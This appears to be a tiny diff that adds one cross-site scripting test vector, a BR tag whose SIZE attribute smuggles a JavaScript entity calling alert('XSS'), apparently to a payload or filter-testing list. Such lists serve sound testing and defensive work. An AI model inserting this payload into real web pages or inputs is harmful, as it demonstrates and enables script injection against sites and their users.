@@ -1,0 +1,1 @@
+<BR SIZE="&{alert('XSS')}">
